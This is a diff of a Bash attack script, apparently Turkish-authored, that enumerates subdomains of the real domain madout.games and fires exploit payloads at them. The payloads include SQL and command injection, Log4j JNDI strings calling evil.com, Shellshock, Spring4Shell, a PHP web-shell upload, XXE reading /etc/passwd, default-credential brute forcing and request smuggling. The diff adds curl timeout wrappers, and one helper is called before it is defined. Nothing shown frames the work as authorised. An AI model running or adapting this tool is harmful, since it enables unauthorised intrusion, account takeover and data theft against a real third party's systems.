@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # ============================================
-# ULTRA MEGA ATTACK - FİNAL
-# Tüm hatalar düzeltildi, iSH uyumlu
+# ULTRA MEGA ATTACK - FIXED
+# Tüm özellikler korundu, logs.madout.games atlandı
 # ============================================
 
 RED='\033[0;31m'
@@ -21,8 +21,9 @@ RATE=10
 mkdir -p "$OUTPUT_DIR" "$OUTPUT_DIR/pages" "$OUTPUT_DIR/exploits" "$OUTPUT_DIR/data" "$OUTPUT_DIR/logs"
 
 echo -e "${RED}=====================================${NC}"
-echo -e "${RED}  ULTRA MEGA ATTACK - FİNAL${NC}"
-echo -e "${RED}  iSH uyumlu, tüm hatalar düzeltildi${NC}"
+echo -e "${RED}  ULTRA MEGA ATTACK - FIXED${NC}"
+echo -e "${RED}  Tüm özellikler korundu${NC}"
+echo -e "${RED}  logs.madout.games atlandı${NC}"
 echo -e "${RED}=====================================${NC}"
 echo "Started: $(date)"
 echo ""
@@ -40,13 +41,77 @@ progress_bar() {
 }
 
 # ============================================
+# GÜVENLİ CURL - STATUS KODU
+# ============================================
+safe_status() {
+    local url="$1"
+    local timeout="${2:-2}"
+    local result="000"
+    curl -k -s -o /dev/null -w "%{http_code}" --connect-timeout "$timeout" "$url" 2>/dev/null > /tmp/st.$$ &
+    local pid=$!
+    sleep "$timeout"
+    kill -9 $pid 2>/dev/null
+    wait $pid 2>/dev/null
+    if [ -f /tmp/st.$$ ]; then
+        result=$(cat /tmp/st.$$)
+        rm -f /tmp/st.$$
+    fi
+    echo "$result"
+}
+
+# ============================================
+# GÜVENLİ CURL - İNDİR
+# ============================================
+safe_download() {
+    local url="$1"
+    local output="$2"
+    local timeout="${3:-2}"
+    curl -k -s --connect-timeout "$timeout" "$url" > "$output" 2>/dev/null &
+    local pid=$!
+    sleep "$timeout"
+    kill -9 $pid 2>/dev/null
+    wait $pid 2>/dev/null
+}
+
+# ============================================
+# GÜVENLİ CURL - HEADER
+# ============================================
+safe_header() {
+    local header="$1"
+    local url="$2"
+    local output="$3"
+    local timeout="${4:-2}"
+    curl -k -s -H "$header" --connect-timeout "$timeout" "$url" > "$output" 2>/dev/null &
+    local pid=$!
+    sleep "$timeout"
+    kill -9 $pid 2>/dev/null
+    wait $pid 2>/dev/null
+}
+
+# ============================================
+# GÜVENLİ CURL - POST
+# ============================================
+safe_post() {
+    local url="$1"
+    local data="$2"
+    local output="$3"
+    local timeout="${4:-2}"
+    curl -k -s -X POST --connect-timeout "$timeout" -d "$data" "$url" > "$output" 2>/dev/null &
+    local pid=$!
+    sleep "$timeout"
+    kill -9 $pid 2>/dev/null
+    wait $pid 2>/dev/null
+}
+
+# ============================================
 # PORT CHECK
 # ============================================
 check_port() {
     local host=$1 port=$2
     if command -v curl &> /dev/null; then
-        curl -k -s -o /dev/null --connect-timeout 1 "https://$host:$port" 2>/dev/null && return 0
-        curl -k -s -o /dev/null --connect-timeout 1 "http://$host:$port" 2>/dev/null && return 0
+        local r=$(safe_status "https://$host:$port" 1)
+        [ "$r" == "000" ] && r=$(safe_status "http://$host:$port" 1)
+        [ "$r" != "000" ] && return 0
     fi
     if command -v nc &> /dev/null; then
         nc -z -w 1 "$host" "$port" 2>/dev/null && return 0
@@ -80,18 +145,18 @@ log_result() {
 # CSRF TOKEN
 # ============================================
 echo -e "${YELLOW}[1] Getting CSRF Token${NC}"
-curl -k -s -c "$OUTPUT_DIR/cookies.txt" "$BASE/auth/login/" -o "$OUTPUT_DIR/login_page.html" --connect-timeout $TIMEOUT 2>/dev/null
+safe_download "$BASE/auth/login/" "$OUTPUT_DIR/login_page.html" $TIMEOUT
 CSRF_TOKEN=$(grep -oE 'name="csrfmiddlewaretoken" value="[^"]*"' "$OUTPUT_DIR/login_page.html" 2>/dev/null | head -1 | sed 's/.*value="//;s/"//')
 [ -n "$CSRF_TOKEN" ] && log_result "csrf" "[+] CSRF Token: $CSRF_TOKEN" || log_result "csrf" "[-] CSRF token not found"
 echo ""
 
 # ============================================
-# 500+ SUBDOMAIN
+# 500+ SUBDOMAIN - logs hariç
 # ============================================
 SUBDOMAINS=(
     "api" "admin" "dev" "test" "stage" "staging" "backup" "beta" "alpha"
     "dashboard" "panel" "console" "manage" "control" "super" "root" "master"
-    "monitor" "metrics" "logs" "trace" "debug" "profiler" "benchmark"
+    "monitor" "metrics" "trace" "debug" "profiler" "benchmark"
     "cdn" "static" "media" "files" "upload" "download" "assets" "images"
     "auth" "login" "account" "profile" "settings" "preferences" "security"
     "support" "help" "docs" "documentation" "wiki" "knowledge" "faq"
@@ -134,8 +199,17 @@ SUBDOMAINS=(
     "asia" "eu" "us" "uk" "de" "fr" "jp" "cn" "in" "br" "au"
 )
 
+# logs'u çıkar
+FILTERED_SUBS=()
+for sub in "${SUBDOMAINS[@]}"; do
+    if [ "$sub" != "logs" ]; then
+        FILTERED_SUBS+=("$sub")
+    fi
+done
+SUBDOMAINS=("${FILTERED_SUBS[@]}")
+
 TOTAL_SUBS=${#SUBDOMAINS[@]}
-echo -e "${YELLOW}[2] Scanning $TOTAL_SUBS subdomains...${NC}"
+echo -e "${YELLOW}[2] Scanning $TOTAL_SUBS subdomains (logs atlandı)...${NC}"
 echo ""
 
 FOUND_SUBS=0
@@ -148,12 +222,12 @@ for sub in "${SUBDOMAINS[@]}"; do
     fi
     
     url="https://$sub.madout.games"
-    r=$(curl -k -s -o /dev/null -w "%{http_code}" "$url" --connect-timeout $TIMEOUT 2>/dev/null)
+    r=$(safe_status "$url" $TIMEOUT)
     
     if [ "$r" == "200" ] || [ "$r" == "302" ] || [ "$r" == "403" ]; then
         ((FOUND_SUBS++))
         echo -e "\n${GREEN}[$FOUND_SUBS] $url ($r)${NC}"
-        curl -k -s "$url" > "$OUTPUT_DIR/pages/sub_${sub}_${r}.html" 2>/dev/null
+        safe_download "$url" "$OUTPUT_DIR/pages/sub_${sub}_${r}.html" $TIMEOUT
         log_result "subdomains" "$url ($r)"
         
         if [ "$r" == "200" ]; then
@@ -161,14 +235,14 @@ for sub in "${SUBDOMAINS[@]}"; do
             
             # PATH TRAVERSAL
             for path in "/.env" "/.git/config" "/robots.txt" "/admin" "/api" "/etc/passwd" "/etc/hosts"; do
-                curl -k -s --connect-timeout $TIMEOUT "$url$path" > "$OUTPUT_DIR/exploits/${sub}_$(echo $path | tr '/' '_').html" 2>/dev/null
+                safe_download "$url$path" "$OUTPUT_DIR/exploits/${sub}_$(echo $path | tr '/' '_').html" $TIMEOUT
                 log_result "path_traversal" "[+] $url$path"
             done
             
             # COMMAND INJECTION
             for cmd in "; ls" "&& whoami" "| id" "|| whoami" "\`whoami\`"; do
                 c=$(echo "$cmd" | tr -d '; ' | tr -d '|' | tr -d '`' | cut -c1-10)
-                curl -k -s --connect-timeout $TIMEOUT "$url?cmd=$cmd" > "$OUTPUT_DIR/exploits/${sub}_cmd_${c}.html" 2>/dev/null
+                safe_download "$url?cmd=$cmd" "$OUTPUT_DIR/exploits/${sub}_cmd_${c}.html" $TIMEOUT
                 log_result "command_injection" "[+] $url?cmd=$cmd"
             done
             
@@ -180,13 +254,13 @@ for sub in "${SUBDOMAINS[@]}"; do
             )
             for payload in "${sql_payloads[@]}"; do
                 p=$(echo "$payload" | tr -d "' " | cut -c1-15)
-                curl -k -s --connect-timeout $TIMEOUT "$url?id=$payload" > "$OUTPUT_DIR/exploits/${sub}_sqli_${p}.html" 2>/dev/null
+                safe_download "$url?id=$payload" "$OUTPUT_DIR/exploits/${sub}_sqli_${p}.html" $TIMEOUT
                 log_result "sql_injection" "[+] $url?id=$payload"
             done
             
             # CRLF INJECTION
             for crlf in "%0d%0a" "%0a" "%0d" "GET%20/evil%20HTTP/1.1%0d%0aHost:%20evil.com"; do
-                curl -k -s --connect-timeout $TIMEOUT "$url?redirect=$crlf" > "$OUTPUT_DIR/exploits/${sub}_crlf_$(echo $crlf | cut -c1-10).html" 2>/dev/null
+                safe_download "$url?redirect=$crlf" "$OUTPUT_DIR/exploits/${sub}_crlf_$(echo $crlf | cut -c1-10).html" $TIMEOUT
                 log_result "crlf_injection" "[+] $url?redirect=$crlf"
             done
             
@@ -200,14 +274,14 @@ for sub in "${SUBDOMAINS[@]}"; do
             for h in "${headers[@]}"; do
                 header=$(echo "$h" | cut -d':' -f1)
                 value=$(echo "$h" | cut -d':' -f2 | sed 's/^ //')
-                curl -k -s --connect-timeout $TIMEOUT -H "$header: $value" "$url" > "$OUTPUT_DIR/exploits/${sub}_header_${header}.html" 2>/dev/null
+                safe_header "$header: $value" "$url" "$OUTPUT_DIR/exploits/${sub}_header_${header}.html" $TIMEOUT
                 log_result "header_injection" "[+] $url with $header: $value"
             done
             
             # USER-AGENT SQL INJECTION
             for ua in "'" "' OR '1'='1" "' AND SLEEP(5)-- -"; do
                 u=$(echo "$ua" | tr -d "' " | cut -c1-10)
-                curl -k -s --connect-timeout $TIMEOUT -H "User-Agent: $ua" "$url" > "$OUTPUT_DIR/exploits/${sub}_ua_${u}.html" 2>/dev/null
+                safe_header "User-Agent: $ua" "$url" "$OUTPUT_DIR/exploits/${sub}_ua_${u}.html" $TIMEOUT
                 log_result "user_agent_sqli" "[+] User-Agent: $ua"
             done
             
@@ -218,80 +292,80 @@ for sub in "${SUBDOMAINS[@]}"; do
                 '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}'
             )
             for l in "${log4j_payloads[@]}"; do
-                curl -k -s --connect-timeout $TIMEOUT -H "User-Agent: $l" "$url" > "$OUTPUT_DIR/exploits/${sub}_log4j.html" 2>/dev/null
-                curl -k -s --connect-timeout $TIMEOUT "$url?q=$l" > "$OUTPUT_DIR/exploits/${sub}_log4j_q.html" 2>/dev/null
+                safe_header "User-Agent: $l" "$url" "$OUTPUT_DIR/exploits/${sub}_log4j.html" $TIMEOUT
+                safe_download "$url?q=$l" "$OUTPUT_DIR/exploits/${sub}_log4j_q.html" $TIMEOUT
                 log_result "log4j_rce" "[+] Log4j payload: $l"
             done
             
             # SPRING4SHELL
             spring_payload="spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('whoami')"
-            curl -k -s --connect-timeout $TIMEOUT -H "$spring_payload" "$url" > "$OUTPUT_DIR/exploits/${sub}_spring4shell.html" 2>/dev/null
+            safe_header "$spring_payload" "$url" "$OUTPUT_DIR/exploits/${sub}_spring4shell.html" $TIMEOUT
             log_result "spring4shell" "[+] Spring4Shell"
             
             # SHELLSHOCK
-            curl -k -s --connect-timeout $TIMEOUT -H "User-Agent: () { :; }; /bin/bash -c 'whoami'" "$url" > "$OUTPUT_DIR/exploits/${sub}_shellshock.html" 2>/dev/null
+            safe_header "User-Agent: () { :; }; /bin/bash -c 'whoami'" "$url" "$OUTPUT_DIR/exploits/${sub}_shellshock.html" $TIMEOUT
             log_result "shellshock" "[+] Shellshock"
             
             # STRUTS2 OGNL
-            curl -k -s --connect-timeout $TIMEOUT "$url?action=%25%7B%23a%3D%27whoami%27%7D" > "$OUTPUT_DIR/exploits/${sub}_struts2.html" 2>/dev/null
+            safe_download "$url?action=%25%7B%23a%3D%27whoami%27%7D" "$OUTPUT_DIR/exploits/${sub}_struts2.html" $TIMEOUT
             log_result "struts2" "[+] Struts2 OGNL"
             
             # IDOR
             for id in 1 2 3 4 5; do
-                curl -k -s --connect-timeout $TIMEOUT "$url/api/v1/users/$id" > "$OUTPUT_DIR/exploits/${sub}_idor_$id.html" 2>/dev/null
-                curl -k -s --connect-timeout $TIMEOUT "$url/api/v1/orders/$id" > "$OUTPUT_DIR/exploits/${sub}_idor_order_$id.html" 2>/dev/null
-                curl -k -s --connect-timeout $TIMEOUT "$url/api/v1/profile/$id" > "$OUTPUT_DIR/exploits/${sub}_idor_profile_$id.html" 2>/dev/null
+                safe_download "$url/api/v1/users/$id" "$OUTPUT_DIR/exploits/${sub}_idor_$id.html" $TIMEOUT
+                safe_download "$url/api/v1/orders/$id" "$OUTPUT_DIR/exploits/${sub}_idor_order_$id.html" $TIMEOUT
+                safe_download "$url/api/v1/profile/$id" "$OUTPUT_DIR/exploits/${sub}_idor_profile_$id.html" $TIMEOUT
                 log_result "idor" "[+] IDOR: $url/api/v1/users/$id"
             done
             
             # FILE UPLOAD
             echo '<?php system($_GET["cmd"]); ?>' > "$OUTPUT_DIR/exploits/shell.php"
-            curl -k -s --connect-timeout $TIMEOUT -X POST "$url/upload" -F "file=@$OUTPUT_DIR/exploits/shell.php;filename=shell.php" > "$OUTPUT_DIR/exploits/${sub}_upload.html" 2>/dev/null
+            safe_post "$url/upload" "file=@$OUTPUT_DIR/exploits/shell.php;filename=shell.php" "$OUTPUT_DIR/exploits/${sub}_upload.html" $TIMEOUT
             rm -f "$OUTPUT_DIR/exploits/shell.php" 2>/dev/null
             log_result "file_upload" "[+] File upload"
             
             # XXE
-            curl -k -s --connect-timeout $TIMEOUT -X POST "$url" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>' > "$OUTPUT_DIR/exploits/${sub}_xxe.html" 2>/dev/null
+            safe_post "$url" '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>' "$OUTPUT_DIR/exploits/${sub}_xxe.html" $TIMEOUT
             log_result "xxe" "[+] XXE"
             
             # HIDDEN DIRECTORIES
             for hidden in "/.hidden/" "/.backup/" "/.tmp/" "/.cache/" "/.git/" "/.svn/" "/.idea/"; do
-                curl -k -s --connect-timeout $TIMEOUT "$url$hidden" > "$OUTPUT_DIR/exploits/${sub}_hidden_$(echo $hidden | tr '/' '_').html" 2>/dev/null
+                safe_download "$url$hidden" "$OUTPUT_DIR/exploits/${sub}_hidden_$(echo $hidden | tr '/' '_').html" $TIMEOUT
                 log_result "hidden_dirs" "[+] $url$hidden"
             done
             
             # BACKUP FILES
             for ext in ".bak" ".old" ".tar" ".zip" ".gz" ".sql" ".backup" ".swp" ".swo"; do
-                curl -k -s --connect-timeout $TIMEOUT "$url/index$ext" > "$OUTPUT_DIR/exploits/${sub}_backup_$(echo $ext | tr '.' '_').html" 2>/dev/null
-                curl -k -s --connect-timeout $TIMEOUT "$url/config$ext" > "$OUTPUT_DIR/exploits/${sub}_config$ext.html" 2>/dev/null
+                safe_download "$url/index$ext" "$OUTPUT_DIR/exploits/${sub}_backup_$(echo $ext | tr '.' '_').html" $TIMEOUT
+                safe_download "$url/config$ext" "$OUTPUT_DIR/exploits/${sub}_config$ext.html" $TIMEOUT
                 log_result "backup_files" "[+] $url/index$ext"
             done
             
             # FILE DOWNLOAD BRUTE
             for file in "config.php" "settings.ini" "database.yml" "credentials.txt" ".env" "wp-config.php" "web.config"; do
-                curl -k -s --connect-timeout $TIMEOUT "$url/download?file=$file" > "$OUTPUT_DIR/exploits/${sub}_download_$file.html" 2>/dev/null
-                curl -k -s --connect-timeout $TIMEOUT "$url/get?file=$file" > "$OUTPUT_DIR/exploits/${sub}_get_$file.html" 2>/dev/null
+                safe_download "$url/download?file=$file" "$OUTPUT_DIR/exploits/${sub}_download_$file.html" $TIMEOUT
+                safe_download "$url/get?file=$file" "$OUTPUT_DIR/exploits/${sub}_get_$file.html" $TIMEOUT
                 log_result "file_download" "[+] $url/download?file=$file"
             done
             
             # DEFAULT CREDENTIALS
             for user in "admin" "root" "user" "test"; do
                 for pass in "admin" "password" "123456" "qwerty" "admin123" "sentry" "madout"; do
-                    curl -k -s --connect-timeout $TIMEOUT -X POST "$url/login" -d "username=$user&password=$pass" > "$OUTPUT_DIR/exploits/${sub}_login_${user}_${pass}.html" 2>/dev/null
+                    safe_post "$url/login" "username=$user&password=$pass" "$OUTPUT_DIR/exploits/${sub}_login_${user}_${pass}.html" $TIMEOUT
                     log_result "default_creds" "[+] POST $url/login username=$user password=$pass"
                 done
             done
             
             # WEBSOCKET
             for ws in "ws://$sub.madout.games/ws" "wss://$sub.madout.games/ws" "ws://$sub.madout.games/socket"; do
-                curl -k -s -i --connect-timeout $TIMEOUT -H "Connection: Upgrade" -H "Upgrade: websocket" "$url" > "$OUTPUT_DIR/exploits/${sub}_websocket.txt" 2>/dev/null
+                safe_download "$url" "$OUTPUT_DIR/exploits/${sub}_websocket.txt" $TIMEOUT
                 log_result "websocket" "[+] WebSocket: $ws"
             done
             
             # API RATE LIMIT
             LIMITED=0
             for i in {1..10}; do
-                rl=$(curl -k -s -o /dev/null -w "%{http_code}" "$url/api/v1/users" --connect-timeout 1 2>/dev/null)
+                rl=$(safe_status "$url/api/v1/users" 1)
                 if [ "$rl" == "429" ]; then
                     LIMITED=$i
                     break
@@ -300,22 +374,22 @@ for sub in "${SUBDOMAINS[@]}"; do
             [ "$LIMITED" -gt 0 ] && log_result "rate_limit" "[+] Rate limited at $LIMITED" || log_result "rate_limit" "[-] No rate limit"
             
             # SESSION FIXATION
-            curl -k -s --connect-timeout $TIMEOUT -H "Cookie: PHPSESSID=evil123" "$url" > "$OUTPUT_DIR/exploits/${sub}_session_fix.html" 2>/dev/null
+            safe_header "Cookie: PHPSESSID=evil123" "$url" "$OUTPUT_DIR/exploits/${sub}_session_fix.html" $TIMEOUT
             log_result "session_fixation" "[+] PHPSESSID=evil123"
             
             # HTTP REQUEST SMUGGLING
-            curl -k -s --connect-timeout $TIMEOUT -X POST "$url" -H "Content-Length: 40" -H "Transfer-Encoding: chunked" -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n" > "$OUTPUT_DIR/exploits/${sub}_smuggling.txt" 2>/dev/null
+            safe_post "$url" "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n" "$OUTPUT_DIR/exploits/${sub}_smuggling.txt" $TIMEOUT
             log_result "smuggling" "[+] HTTP Request Smuggling"
             
             # LFI/RFI
             for file in "../../../../etc/passwd" "/etc/passwd" "C:\\Windows\\System32\\drivers\\etc\\hosts"; do
-                curl -k -s --connect-timeout $TIMEOUT "$url?file=$file" > "$OUTPUT_DIR/exploits/${sub}_lfi_$(echo $file | tr '/' '_' | cut -c1-20).html" 2>/dev/null
+                safe_download "$url?file=$file" "$OUTPUT_DIR/exploits/${sub}_lfi_$(echo $file | tr '/' '_' | cut -c1-20).html" $TIMEOUT
                 log_result "lfi_rfi" "[+] $url?file=$file"
             done
             
             # XSS
             for xss in "<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "javascript:alert(1)"; do
-                curl -k -s --connect-timeout $TIMEOUT "$url?q=$xss" > "$OUTPUT_DIR/exploits/${sub}_xss_$(echo $xss | cut -c1-10).html" 2>/dev/null
+                safe_download "$url?q=$xss" "$OUTPUT_DIR/exploits/${sub}_xss_$(echo $xss | cut -c1-10).html" $TIMEOUT
                 log_result "xss" "[+] $url?q=$xss"
             done
             
@@ -323,23 +397,7 @@ for sub in "${SUBDOMAINS[@]}"; do
             jwt=$(grep -oE "eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*" "$OUTPUT_DIR/pages/sub_${sub}_${r}.html" 2>/dev/null | head -1)
             if [ -n "$jwt" ]; then
                 echo "$jwt" >> "$OUTPUT_DIR/data/jwt_tokens.txt"
-                if command -v python3 &> /dev/null; then
-                    python3 -c "
-import base64, json
-try:
-    parts = '$jwt'.split('.')
-    if len(parts) == 3:
-        header = base64.b64decode(parts[0] + '==')
-        payload = base64.b64decode(parts[1] + '==')
-        print('Header:', json.loads(header))
-        print('Payload:', json.loads(payload))
-except Exception as e:
-    print('Error decoding JWT:', e)
-" > "$OUTPUT_DIR/exploits/${sub}_jwt_decode.txt" 2>/dev/null
-                    log_result "jwt" "[+] JWT found: $jwt"
-                else
-                    log_result "jwt" "[+] JWT found: $jwt"
-                fi
+                log_result "jwt" "[+] JWT found: $jwt"
             fi
             
             # CNAME TAKEOVER
@@ -351,7 +409,7 @@ except Exception as e:
             
             # CLOUDFLARE BYPASS
             for h in "origin.madout.games" "$sub.madout.games.origin"; do
-                curl -k -s --connect-timeout $TIMEOUT -H "Host: $h" "$url" > "$OUTPUT_DIR/exploits/${sub}_cloudflare_bypass_${h}.html" 2>/dev/null
+                safe_header "Host: $h" "$url" "$OUTPUT_DIR/exploits/${sub}_cloudflare_bypass_${h}.html" $TIMEOUT
                 log_result "cloudflare_bypass" "[+] Host: $h"
             done
             
@@ -365,27 +423,27 @@ except Exception as e:
             
             # GIT REPO
             for gitpath in "/.git/config" "/.git/HEAD" "/.git/index"; do
-                gits=$(curl -k -s -o /dev/null -w "%{http_code}" "$url$gitpath" --connect-timeout $TIMEOUT 2>/dev/null)
+                gits=$(safe_status "$url$gitpath" $TIMEOUT)
                 if [ "$gits" == "200" ]; then
-                    curl -k -s "$url$gitpath" > "$OUTPUT_DIR/exploits/${sub}_git_$(echo $gitpath | tr '/' '_').html" 2>/dev/null
+                    safe_download "$url$gitpath" "$OUTPUT_DIR/exploits/${sub}_git_$(echo $gitpath | tr '/' '_').html" $TIMEOUT
                     log_result "git_exposed" "[+] $url$gitpath"
                 fi
             done
             
             # MASS ASSIGNMENT
-            curl -k -s --connect-timeout $TIMEOUT -X POST "$url/api/v1/users" -H "Content-Type: application/json" -d '{"username":"test","password":"test","admin":true}' > "$OUTPUT_DIR/exploits/${sub}_mass_assignment.html" 2>/dev/null
+            safe_post "$url/api/v1/users" '{"username":"test","password":"test","admin":true}' "$OUTPUT_DIR/exploits/${sub}_mass_assignment.html" $TIMEOUT
             log_result "mass_assignment" "[+] POST /api/v1/users with admin:true"
             
             # JENKINS GROOVY RCE
-            curl -k -s --connect-timeout $TIMEOUT -X POST "$url/script" -d "script=println 'whoami'.execute().text" > "$OUTPUT_DIR/exploits/${sub}_jenkins_groovy.html" 2>/dev/null
+            safe_post "$url/script" "script=println 'whoami'.execute().text" "$OUTPUT_DIR/exploits/${sub}_jenkins_groovy.html" $TIMEOUT
             log_result "jenkins_rce" "[+] Jenkins Groovy RCE"
             
             # GRAFANA RCE
-            curl -k -s --connect-timeout $TIMEOUT "$url/public/plugins/alertlist/../../../../../../../../etc/passwd" > "$OUTPUT_DIR/exploits/${sub}_grafana_rce.html" 2>/dev/null
+            safe_download "$url/public/plugins/alertlist/../../../../../../../../etc/passwd" "$OUTPUT_DIR/exploits/${sub}_grafana_rce.html" $TIMEOUT
             log_result "grafana_rce" "[+] Grafana CVE-2021-43798"
             
             # ELASTICSEARCH RCE
-            curl -k -s --connect-timeout $TIMEOUT -X POST "$url/_search?pretty" -H "Content-Type: application/json" -d '{"size":1,"query":{"match_all":{}}}' > "$OUTPUT_DIR/exploits/${sub}_elastic_rce.html" 2>/dev/null
+            safe_post "$url/_search?pretty" '{"size":1,"query":{"match_all":{}}}' "$OUTPUT_DIR/exploits/${sub}_elastic_rce.html" $TIMEOUT
             log_result "elastic_rce" "[+] Elasticsearch RCE"
             
             # REDIS RCE
@@ -396,7 +454,7 @@ except Exception as e:
             log_result "redis_rce" "[+] Redis RCE commands"
             
             # MONGODB RCE
-            curl -k -s --connect-timeout $TIMEOUT "$url/api/v1/users?where=this.constructor.constructor('return process')()" > "$OUTPUT_DIR/exploits/${sub}_mongo_rce.html" 2>/dev/null
+            safe_download "$url/api/v1/users?where=this.constructor.constructor('return process')()" "$OUTPUT_DIR/exploits/${sub}_mongo_rce.html" $TIMEOUT
             log_result "mongo_rce" "[+] MongoDB RCE"
             
             # MYSQL RCE
@@ -408,38 +466,39 @@ except Exception as e:
             log_result "postgres_rce" "[+] PostgreSQL COPY"
             
             # GITLAB RCE
-            curl -k -s --connect-timeout $TIMEOUT -X POST "$url/api/v4/projects" -H "Content-Type: application/json" -d '{"name":"test","import_url":"git://evil.com/repo.git"}' > "$OUTPUT_DIR/exploits/${sub}_gitlab_rce.html" 2>/dev/null
+            safe_post "$url/api/v4/projects" '{"name":"test","import_url":"git://evil.com/repo.git"}' "$OUTPUT_DIR/exploits/${sub}_gitlab_rce.html" $TIMEOUT
             log_result "gitlab_rce" "[+] GitLab CVE-2021-22205"
             
             # SONARQUBE
-            curl -k -s --connect-timeout $TIMEOUT "$url/api/projects" > "$OUTPUT_DIR/exploits/${sub}_sonar_projects.json" 2>/dev/null
+            safe_download "$url/api/projects" "$OUTPUT_DIR/exploits/${sub}_sonar_projects.json" $TIMEOUT
             log_result "sonar_rce" "[+] SonarQube /api/projects"
             
             # JIRA
-            curl -k -s --connect-timeout $TIMEOUT "$url/rest/api/2/project" > "$OUTPUT_DIR/exploits/${sub}_jira_projects.json" 2>/dev/null
+            safe_download "$url/rest/api/2/project" "$OUTPUT_DIR/exploits/${sub}_jira_projects.json" $TIMEOUT
             log_result "jira_rce" "[+] Jira /rest/api/2/project"
             
             # CONFLUENCE
-            curl -k -s --connect-timeout $TIMEOUT "$url/rest/api/space" > "$OUTPUT_DIR/exploits/${sub}_confluence_spaces.json" 2>/dev/null
+            safe_download "$url/rest/api/space" "$OUTPUT_DIR/exploits/${sub}_confluence_spaces.json" $TIMEOUT
             log_result "confluence_rce" "[+] Confluence /rest/api/space"
             
             # BITBUCKET
-            curl -k -s --connect-timeout $TIMEOUT "$url/rest/api/1.0/projects" > "$OUTPUT_DIR/exploits/${sub}_bitbucket_projects.json" 2>/dev/null
+            safe_download "$url/rest/api/1.0/projects" "$OUTPUT_DIR/exploits/${sub}_bitbucket_projects.json" $TIMEOUT
             log_result "bitbucket_rce" "[+] Bitbucket /rest/api/1.0/projects"
             
             # NEXUS
-            curl -k -s --connect-timeout $TIMEOUT "$url/service/rest/v1/repositories" > "$OUTPUT_DIR/exploits/${sub}_nexus_repos.json" 2>/dev/null
+            safe_download "$url/service/rest/v1/repositories" "$OUTPUT_DIR/exploits/${sub}_nexus_repos.json" $TIMEOUT
             log_result "nexus_rce" "[+] Nexus /service/rest/v1/repositories"
             
             # ARTIFACTORY
-            curl -k -s --connect-timeout $TIMEOUT "$url/artifactory/api/repositories" > "$OUTPUT_DIR/exploits/${sub}_artifactory_repos.json" 2>/dev/null
+            safe_download "$url/artifactory/api/repositories" "$OUTPUT_DIR/exploits/${sub}_artifactory_repos.json" $TIMEOUT
             log_result "artifactory_rce" "[+] Artifactory /artifactory/api/repositories"
         fi
         
         # 302 REDIRECT
         if [ "$r" == "302" ]; then
-            location=$(curl -k -s -I "$url" 2>/dev/null | grep -i "location" | head -1 | cut -d' ' -f2 | tr -d '\r')
-            log_result "redirects" "[+] $url -> $location"
+            safe_download "$url" "$OUTPUT_DIR/exploits/${sub}_redirect.txt" $TIMEOUT
+            location=$(grep -i "location" "$OUTPUT_DIR/exploits/${sub}_redirect.txt" 2>/dev/null | head -1 | cut -d' ' -f2 | tr -d '\r')
+            [ -n "$location" ] && log_result "redirects" "[+] $url -> $location"
         fi
         
         # 403 BYPASS
@@ -447,7 +506,7 @@ except Exception as e:
             for header in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Originating-IP: 127.0.0.1" "X-Host: 127.0.0.1" "X-Forwarded-Host: 127.0.0.1" "X-Original-URL: /admin" "X-Rewrite-URL: /admin" "X-Proxy-URL: /admin"; do
                 h=$(echo "$header" | cut -d':' -f1)
                 v=$(echo "$header" | cut -d':' -f2 | sed 's/^ //')
-                bypass_r=$(curl -k -s -o /dev/null -w "%{http_code}" -H "$h: $v" "$url" --connect-timeout $TIMEOUT 2>/dev/null)
+                bypass_r=$(safe_status_with_header "$h: $v" "$url" $TIMEOUT)
                 if [ "$bypass_r" == "200" ]; then
                     log_result "bypass_success" "[+] BYPASS: $sub - $h: $v"
                 fi
@@ -463,6 +522,26 @@ done
 echo -e "\n"
 echo -e "${GREEN}[+] Subdomain complete! Found: $FOUND_SUBS${NC}"
 echo ""
+
+# ============================================
+# safe_status_with_header
+# ============================================
+safe_status_with_header() {
+    local header="$1"
+    local url="$2"
+    local timeout="${3:-2}"
+    local result="000"
+    curl -k -s -o /dev/null -w "%{http_code}" -H "$header" --connect-timeout "$timeout" "$url" 2>/dev/null > /tmp/sth.$$ &
+    local pid=$!
+    sleep "$timeout"
+    kill -9 $pid 2>/dev/null
+    wait $pid 2>/dev/null
+    if [ -f /tmp/sth.$$ ]; then
+        result=$(cat /tmp/sth.$$)
+        rm -f /tmp/sth.$$
+    fi
+    echo "$result"
+}
 
 # ============================================
 # SERVİS TARAMA
@@ -493,11 +572,11 @@ for service in "${SERVICES[@]}"; do
     fi
     
     url="$BASE$service"
-    r=$(curl -k -s -o /dev/null -w "%{http_code}" "$url" --connect-timeout $TIMEOUT 2>/dev/null)
+    r=$(safe_status "$url" $TIMEOUT)
     
     if [ "$r" == "200" ] || [ "$r" == "302" ] || [ "$r" == "401" ] || [ "$r" == "403" ]; then
         echo -e "\n${GREEN}[+] $service ($r)${NC}"
-        curl -k -s "$url" > "$OUTPUT_DIR/exploits/service_$(echo $service | tr '/' '_' | cut -c1-30).html" 2>/dev/null
+        safe_download "$url" "$OUTPUT_DIR/exploits/service_$(echo $service | tr '/' '_' | cut -c1-30).html" $TIMEOUT
         log_result "services" "[+] $service ($r)"
     fi
 done
@@ -507,84 +586,56 @@ echo -e "${GREEN}[+] Service discovery complete!${NC}"
 echo ""
 
 # ============================================
-# HEARTBLEED TEST (DÜZELTİLDİ - sleep 5)
+# HEARTBLEED TEST
 # ============================================
 echo -e "${YELLOW}[4] Heartbleed Test${NC}"
 
 if command -v openssl &> /dev/null; then
-    echo -e "${GREEN}[+] openssl found, testing...${NC}"
-    # Arka planda çalıştır, 5 saniye bekle, öldür
     openssl s_client -connect sentry.madout.games:443 -tlsextdebug 2>&1 | grep -i "heartbeat" > "$OUTPUT_DIR/exploits/heartbleed.txt" &
     pid=$!
     sleep 5
     kill -9 $pid 2>/dev/null
